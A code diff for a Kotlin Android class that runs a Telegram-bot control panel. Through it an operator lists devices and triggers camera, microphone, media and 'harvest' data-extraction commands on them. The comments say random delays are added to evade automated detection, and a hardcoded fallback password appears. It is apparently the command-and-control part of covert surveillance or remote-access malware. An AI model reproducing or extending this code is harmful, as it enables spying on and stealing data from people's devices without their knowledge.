@@ -27,12 +27,8 @@ import com.example.app.safeGet
  * فئة إدارة واجهة Telegram – جميع الأوامر عبر الأزرار عدا /login
  * مع إيموجيات فريدة وتأخير بشري لتجنب الكشف الآلي.
  * 
- * ✅ التعديلات:
- * - تغيير val token إلى var token في دوال apiCall و apiCallMultipart (لإصلاح خطأ reassign)
- * - إضافة applyHumanDelay() لتأخير بشري في handleMessage و handleCallback
- * - إزالة معالجة الأوامر النصية /status, /menu, /logout (الاكتفاء بـ /login)
- * - تغيير إيموجيات الأزرار في getMainKeyboard و getDeviceKeyboard لتكون فريدة
- * - ربط نبض الإشعار (pulseIntent) عند تنفيذ أوامر حساسة (كاميرا، ميكروفون، حصاد)
+ * ✅ تم إصلاح خطأ السطر 147 (Val cannot be reassigned) بتغيير val token إلى var token
+ * في دوال apiCall و apiCallMultipart.
  */
 class TelegramUi(
     context: Context,
@@ -65,7 +61,6 @@ class TelegramUi(
 
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
-    // ✅ التصحيح النهائي: تغيير val إلى var لإمكانية إعادة التعيين
     private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: run {
         Log.w(TAG, "⚠️ Secret not found in config, using default password")
         "Zaen123@123@"
@@ -124,23 +119,14 @@ class TelegramUi(
 
     // ==================== دوال مساعدة ====================
 
-    /**
-     * تأخير بشري عشوائي لمحاكاة سلوك المستخدم وتجنب الكشف الآلي.
-     */
     private suspend fun humanDelay() {
         delay(Random.nextLong(800, 2500))
     }
 
-    /**
-     * تأخير بشري محسّن مع نطاق أوسع (900-2400 مللي)
-     */
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(900, 2400))
     }
 
-    /**
-     * إرسال نبض للخدمة الأمامية لإظهار إشعار عابر.
-     */
     private fun pulseIntent(action: String) {
         try {
             Intent(appContext, ForegroundService::class.java).apply {
@@ -538,24 +524,17 @@ class TelegramUi(
     //  أزرار التحكم (جميع الأوامر عبر الأزرار)
     // ============================================================
 
-    /**
-     * القائمة الرئيسية – تحتوي على جميع الأوامر كأزرار عدا /login
-     * ✅ تم تغيير الإيموجيات لتكون فريدة لكل زر
-     */
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
-                // الصف الأول: الأجهزة والذكاء الاصطناعي
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "📱 الأجهزة النشطة"); put("callback_data", "ld") })
                     put(JSONObject().apply { put("text", "🧠 محرك الذكاء"); put("callback_data", "ai_status") })
                 })
-                // الصف الثاني: تجديد الجلسة والحالة
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "⏳ تمديد الجلسة"); put("callback_data", "rnw") })
                     put(JSONObject().apply { put("text", "📊 تقرير النظام"); put("callback_data", "status") })
                 })
-                // الصف الثالث: القائمة وتسجيل الخروج
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "📋 إدارة الأرشيف"); put("callback_data", "menu") })
                     put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
@@ -564,10 +543,6 @@ class TelegramUi(
         }
     }
 
-    /**
-     * قائمة جهاز معين – أزرار التحكم بالجهاز
-     * ✅ تم تغيير الإيموجيات لتكون فريدة لكل زر
-     */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
@@ -648,10 +623,8 @@ class TelegramUi(
             val text = msg.optString("text", "")
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            // ✅ تأخير بشري قبل أي معالجة
             applyHumanDelay()
 
-            // ✅ فقط /login يعمل كأمر نصي، يتم تجاهل أي أمر نصي آخر
             if (text.startsWith("/login")) {
                 if (appPassword.isBlank()) {
                     apiCall("sendMessage", JSONObject().apply {
@@ -684,8 +657,6 @@ class TelegramUi(
                 return
             }
 
-            // ✅ تجاهل أي نص آخر (لا يتم تمريره إلى Commands لمنع الأوامر النصية)
-            // يمكن تسجيل ذلك إذا أردنا
             writeLog("Ignored text command: $text")
 
         } catch (e: Exception) {
@@ -695,7 +666,6 @@ class TelegramUi(
 
     private suspend fun handleCallback(update: JSONObject) {
         try {
-            // ✅ تأخير بشري قبل أي رد
             applyHumanDelay()
 
             val cb = update.optJSONObject("callback_query") ?: return
@@ -737,7 +707,6 @@ class TelegramUi(
                 updateDeviceActivity(deviceId)
             }
 
-            // ✅ ربط النبض عند الأوامر الحساسة
             when {
                 data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
                 data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
@@ -922,7 +891,6 @@ class TelegramUi(
                     }
                     return
                 }
-                // ✅ أوامر الكاميرا والمايك والحصاد تُمرر إلى Commands مع نبض تم إرساله أعلاه
                 data.startsWith("cam_") || data.startsWith("camf_") ||
                 data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") -> {
@@ -937,7 +905,6 @@ class TelegramUi(
                     }
                 }
                 else -> {
-                    // أي أمر آخر (غير معروف) نمرره إلى Commands
                     try {
                         Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
                     } catch (e: Exception) {
